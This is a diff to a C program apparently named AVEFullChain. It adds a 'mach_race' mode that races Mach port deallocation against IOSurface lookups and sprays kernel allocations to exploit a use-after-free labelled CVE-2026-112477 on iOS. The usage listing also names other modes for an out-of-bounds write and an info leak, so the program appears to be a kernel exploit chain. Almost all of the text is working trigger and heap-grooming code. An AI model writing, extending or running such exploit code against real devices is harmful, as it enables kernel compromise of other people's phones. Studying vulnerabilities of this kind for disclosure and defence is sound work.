@@ -71,6 +71,8 @@ extern IOSurfaceRef IOSurfaceLookup(IOSurfaceID csid);
 extern void IOSurfaceIncrementUseCount(IOSurfaceRef surface);
 extern void IOSurfaceDecrementUseCount(IOSurfaceRef surface);
 extern void IOSurfaceRemoveValue(IOSurfaceRef surface, CFStringRef key);
+extern mach_port_t IOSurfaceCreateMachPort(IOSurfaceRef surface);
+extern IOSurfaceRef IOSurfaceLookupFromMachPort(mach_port_t port);
 
 static FILE *g_log = NULL;
 static volatile int g_encode_done = 0;
@@ -9433,6 +9435,246 @@ vps_cd_done:
 
         rlog("=== IOSURFACE_ENUM complete ===\n");
 
+    } else if (strcmp(mode, "mach_race") == 0) {
+        /* Mach port-based IOSurface UAF race.
+         *
+         * Key discovery: IOSurfaceRootUserClient external methods return
+         * kIOReturnUnsupported for ALL selectors 0-2000 on iOS 27.1.
+         * The framework communicates via Mach ports instead:
+         *   - IOSurfaceCreateMachPort(surface) → mach_port_t
+         *   - IOSurfaceLookupFromMachPort(port) → IOSurfaceRef
+         *   - Kernel tracks port↔surface mapping in IOSurfaceSendRight
+         *
+         * CVE-2026-112477 targets this mapping. The race:
+         * Thread A: deallocates the mach port (mach_port_deallocate)
+         * Thread B: looks up the surface from the stale port
+         * Thread C: sprays kalloc to reclaim the freed mapping object
+         *
+         * When the port's send right is deallocated, the kernel frees the
+         * IOSurfaceSendRight object. If we spray the same kalloc zone
+         * before Thread B's lookup completes, the lookup reads our data.
+         */
+        int race_rounds = (argc > 2) ? atoi(argv[2]) : 1000;
+        int groom_count = (argc > 3) ? atoi(argv[3]) : 256;
+        int thread_count = (argc > 4) ? atoi(argv[4]) : 8;
+        if (race_rounds < 10) race_rounds = 10;
+        if (race_rounds > 50000) race_rounds = 50000;
+        if (groom_count < 32) groom_count = 32;
+        if (groom_count > 4096) groom_count = 4096;
+
+        rlog("=== MACH_RACE: Mach port IOSurface UAF ===\n");
+        rlog("rounds=%d groom=%d threads=%d\n\n", race_rounds, groom_count, thread_count);
+
+        /* Create surface properties */
+        CFMutableDictionaryRef mr_props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int mw = 32, mh = 32, mbpe = 4, mbpr = 128;
+        CFNumberRef mwn = CFNumberCreate(NULL, kCFNumberIntType, &mw);
+        CFNumberRef mhn = CFNumberCreate(NULL, kCFNumberIntType, &mh);
+        CFNumberRef mbn = CFNumberCreate(NULL, kCFNumberIntType, &mbpe);
+        CFNumberRef mbrn = CFNumberCreate(NULL, kCFNumberIntType, &mbpr);
+        int mpf = 0x42475241;
+        CFNumberRef mpfn = CFNumberCreate(NULL, kCFNumberIntType, &mpf);
+        CFDictionarySetValue(mr_props, CFSTR("IOSurfaceWidth"), mwn);
+        CFDictionarySetValue(mr_props, CFSTR("IOSurfaceHeight"), mhn);
+        CFDictionarySetValue(mr_props, CFSTR("IOSurfaceBytesPerElement"), mbn);
+        CFDictionarySetValue(mr_props, CFSTR("IOSurfaceBytesPerRow"), mbrn);
+        CFDictionarySetValue(mr_props, CFSTR("IOSurfacePixelFormat"), mpfn);
+
+        /* Phase 1: Verify Mach port APIs */
+        rlog("--- Phase 1: Mach port API verification ---\n");
+        IOSurfaceRef test_s = IOSurfaceCreate(mr_props);
+        if (!test_s) {
+            rlog("FAIL: Cannot create IOSurface\n");
+            CFRelease(mr_props);
+            goto done;
+        }
+        uint32_t test_sid = IOSurfaceGetID(test_s);
+        rlog("Surface: ID=%u alloc=%zu\n", test_sid, IOSurfaceGetAllocSize(test_s));
+
+        mach_port_t test_port = IOSurfaceCreateMachPort(test_s);
+        rlog("CreateMachPort: port=0x%x\n", test_port);
+
+        if (test_port != MACH_PORT_NULL) {
+            IOSurfaceRef looked_up = IOSurfaceLookupFromMachPort(test_port);
+            if (looked_up) {
+                uint32_t lu_id = IOSurfaceGetID(looked_up);
+                rlog("LookupFromMachPort: ID=%u (expected %u) match=%s\n",
+                    lu_id, test_sid, lu_id == test_sid ? "YES" : "NO");
+                CFRelease(looked_up);
+            } else {
+                rlog("LookupFromMachPort: FAILED (returned NULL)\n");
+            }
+            mach_port_deallocate(mach_task_self(), test_port);
+        } else {
+            rlog("FAIL: CreateMachPort returned NULL port\n");
+            CFRelease(test_s);
+            CFRelease(mr_props);
+            goto done;
+        }
+
+        /* Phase 1b: Test what happens after port deallocation */
+        rlog("\n--- Phase 1b: Post-deallocation lookup ---\n");
+        mach_port_t p2 = IOSurfaceCreateMachPort(test_s);
+        rlog("Port2: 0x%x\n", p2);
+        mach_port_deallocate(mach_task_self(), p2);
+        IOSurfaceRef stale_ref = IOSurfaceLookupFromMachPort(p2);
+        rlog("Lookup after dealloc: %s (port 0x%x)\n",
+            stale_ref ? "STILL VALID" : "NULL (expected)", p2);
+        if (stale_ref) {
+            rlog("  ID=%u w=%zu — port send right still alive in kernel\n",
+                IOSurfaceGetID(stale_ref), IOSurfaceGetWidth(stale_ref));
+            CFRelease(stale_ref);
+        }
+
+        /* Phase 1c: Multiple ports for same surface */
+        rlog("\n--- Phase 1c: Multiple ports per surface ---\n");
+        mach_port_t ports[8];
+        for (int i = 0; i < 8; i++) {
+            ports[i] = IOSurfaceCreateMachPort(test_s);
+            rlog("  port[%d] = 0x%x\n", i, ports[i]);
+        }
+        for (int i = 0; i < 8; i++) {
+            if (ports[i]) mach_port_deallocate(mach_task_self(), ports[i]);
+        }
+        CFRelease(test_s);
+
+        /* Phase 2: Race — deallocate port vs lookup from port */
+        rlog("\n--- Phase 2: Mach port dealloc vs lookup race ---\n");
+        int race_hits = 0, race_stale = 0, race_null = 0;
+
+        for (int round = 0; round < race_rounds; round++) {
+            IOSurfaceRef s = IOSurfaceCreate(mr_props);
+            if (!s) continue;
+            uint32_t sid = IOSurfaceGetID(s);
+            mach_port_t p = IOSurfaceCreateMachPort(s);
+            if (p == MACH_PORT_NULL) { CFRelease(s); continue; }
+
+            /* Release our framework reference — kernel port mapping still alive */
+            CFRelease(s);
+
+            /* Race: deallocate port send right vs lookup from port */
+            /* We spin up multiple lookups racing against the dealloc */
+            volatile int go = 0;
+            volatile IOSurfaceRef stale_results[16] = {0};
+            volatile int lookup_done[16] = {0};
+
+            /* Lookup threads */
+            int nlkp = (thread_count > 16) ? 16 : thread_count;
+            for (int i = 0; i < nlkp; i++) {
+                dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+                    while (!go) { /* spin */ }
+                    stale_results[i] = IOSurfaceLookupFromMachPort(p);
+                    lookup_done[i] = 1;
+                });
+            }
+
+            /* Small delay then fire + dealloc */
+            usleep(1);
+            go = 1;
+            mach_port_deallocate(mach_task_self(), p);
+
+            /* Wait for lookups */
+            for (int i = 0; i < nlkp; i++) {
+                int wait = 0;
+                while (!lookup_done[i] && wait < 1000) { usleep(10); wait++; }
+            }
+
+            /* Check results */
+            for (int i = 0; i < nlkp; i++) {
+                IOSurfaceRef r = (IOSurfaceRef)stale_results[i];
+                if (r) {
+                    uint32_t rid = IOSurfaceGetID(r);
+                    size_t rw = IOSurfaceGetWidth(r);
+                    if (rid != sid || rw != 32) {
+                        race_stale++;
+                        if (race_stale <= 10)
+                            rlog("  [%d] *** STALE: id=%u (expected %u) w=%zu ***\n",
+                                round, rid, sid, rw);
+                    } else {
+                        race_hits++;
+                    }
+                    CFRelease(r);
+                } else {
+                    race_null++;
+                }
+            }
+
+            if (round > 0 && round % 500 == 0)
+                rlog("  round %d/%d — hits=%d stale=%d null=%d\n",
+                    round, race_rounds, race_hits, race_stale, race_null);
+        }
+
+        rlog("\nPhase 2 result: %d valid lookups, %d STALE, %d null in %d rounds\n",
+            race_hits, race_stale, race_null, race_rounds);
+
+        /* Phase 3: Race with kalloc spray between dealloc and lookup */
+        rlog("\n--- Phase 3: Dealloc + spray + lookup race ---\n");
+        int spray_hits = 0, spray_stale = 0;
+
+        for (int round = 0; round < (race_rounds > 500 ? 500 : race_rounds); round++) {
+            IOSurfaceRef s = IOSurfaceCreate(mr_props);
+            if (!s) continue;
+            uint32_t sid = IOSurfaceGetID(s);
+            mach_port_t p = IOSurfaceCreateMachPort(s);
+            if (p == MACH_PORT_NULL) { CFRelease(s); continue; }
+
+            /* Release framework ref */
+            CFRelease(s);
+
+            /* Deallocate port */
+            mach_port_deallocate(mach_task_self(), p);
+
+            /* Spray: create many small surfaces to fill freed kalloc slot */
+            IOSurfaceRef *spray = calloc(groom_count, sizeof(IOSurfaceRef));
+            int sprayed = 0;
+            for (int i = 0; i < groom_count; i++) {
+                spray[i] = IOSurfaceCreate(mr_props);
+                if (spray[i]) sprayed++;
+            }
+
+            /* Try to lookup from the now-stale port */
+            IOSurfaceRef stale = IOSurfaceLookupFromMachPort(p);
+            if (stale) {
+                uint32_t stale_id = IOSurfaceGetID(stale);
+                size_t stale_w = IOSurfaceGetWidth(stale);
+                if (stale_id != sid) {
+                    spray_stale++;
+                    if (spray_stale <= 10)
+                        rlog("  [%d] *** REUSE: stale_id=%u (orig=%u) w=%zu sprayed=%d ***\n",
+                            round, stale_id, sid, stale_w, sprayed);
+                } else {
+                    spray_hits++;
+                }
+                CFRelease(stale);
+            }
+
+            for (int i = 0; i < groom_count; i++)
+                if (spray[i]) CFRelease(spray[i]);
+            free(spray);
+
+            if (round > 0 && round % 100 == 0)
+                rlog("  round %d — hits=%d stale=%d\n", round, spray_hits, spray_stale);
+        }
+        rlog("Phase 3 result: %d valid, %d STALE (ID mismatch = reuse)\n",
+            spray_hits, spray_stale);
+
+        if (race_stale > 0 || spray_stale > 0) {
+            rlog("\n*** MACH PORT UAF DETECTED ***\n");
+            rlog("Stale port lookups returning wrong data.\n");
+            rlog("The freed IOSurfaceSendRight was reclaimed by spray.\n");
+        } else {
+            rlog("\nNo UAF via Mach port path.\n");
+            rlog("Port dealloc may fully clean up kernel mapping before lookup.\n");
+            rlog("If Phase 2 showed 'valid lookups' > 0, the race window exists\n");
+            rlog("but spray timing needs tuning.\n");
+        }
+
+        CFRelease(mr_props); CFRelease(mwn); CFRelease(mhn);
+        CFRelease(mbn); CFRelease(mbrn); CFRelease(mpfn);
+
+        rlog("\n=== MACH_RACE complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -9486,6 +9728,7 @@ vps_cd_done:
         rlog("  vps_byte_dump [max_aid] -- KEY: Dump VPS bytes at OOB AlphaLayerID (info leak)\n");
         rlog("  iosurface_uaf [rounds] [groom] [threads] -- KEY: CVE-112477 IOSurface UAF trigger\n");
         rlog("  iosurface_enum [max_sel] [async]  -- KEY: Exhaustive IOSurface selector scan\n");
+        rlog("  mach_race [rounds] [groom] [threads] -- KEY: Mach port IOSurface UAF race\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
